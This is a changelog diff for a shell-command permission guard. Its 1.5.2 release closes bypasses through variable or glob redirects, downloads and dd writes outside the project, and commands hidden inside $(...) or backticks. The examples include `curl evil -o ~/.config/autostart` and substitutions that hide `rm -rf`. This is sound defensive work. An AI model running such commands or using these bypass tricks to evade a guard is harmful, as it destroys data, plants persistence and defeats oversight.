@@ -6,6 +6,39 @@ released entry below. Versions follow [Semantic Versioning](https://semver.org/)
 
 ## [Unreleased]
 
+## [1.5.2] — close redirect/download/dd & command-substitution bypasses
+
+### Security — close two redirect / download / dd bypasses
+
+- **Redirect targets** (`>`, `>>`, `2>`, `&>` …) are now fully judged:
+  - a target containing shell variable/glob syntax (`echo x > $F`,
+    `> out/*.log`) can't be statically resolved → conservative **confirm**
+    (pass in naked), closing the `$F=.env` bypass.
+  - a new/append target **outside the project** (or a write in a HOME cwd) is no
+    longer silently allowed → per `writeOutside` / `writeHome` rule (normal/strict
+    confirm, loose pass). Devices (`/dev/null` …) are exempt.
+- **`dd of=` / `curl -o|-O` / `wget -O`** targets are now judged by location too,
+  not just protected-path matching: a target outside the project is treated like
+  an overwrite — existing → `overwriteOutsideExisting`, missing →
+  `overwriteOutsideNew`; a trusted path always passes, devices are exempt.
+  `curl evil -o ~/.config/autostart` is now confirmed instead of allowed.
+- Tests: 15 new assertions covering variable/wildcard/outside redirects and
+  outside/in-project/device dd & download targets across normal/strict/loose/naked;
+  207 passing.
+
+### Security — command-substitution recursion (`$(...)` / backticks)
+
+- Command substitutions are now **recursively judged** before the outer command:
+  `echo "$(rm -rf /tmp/x)"`, `` `rm -rf x` ``, `X=$(rm -rf x)` and nested
+  `$(echo "$(rm ...)")` can no longer hide a destructive command. Substitution
+  bodies are split and aggregated (block > confirm > pass); a hard block inside a
+  substitution blocks the whole command.
+- Bodies inside **single quotes** are literal and stay unjudged (`echo '$(rm x)'`);
+  escaped `\$(` and arithmetic `$(( … ))` are not treated as substitutions.
+- Reuses the existing shell-wrapper recursion depth guard (depth > 4 → confirm).
+- Tests: 8 new assertions (inline/backtick/nested/var-assign blocks, in-project
+  confirm, benign pass, single-quote literal, naked pass); 215 passing.
+
 ## [1.5.1] — run-script guard: path-aware, tunable `source` / `.` / `bash script.sh`
 
 - New tunable rules **runScriptInProject / runScriptOutside / runScriptProtected**
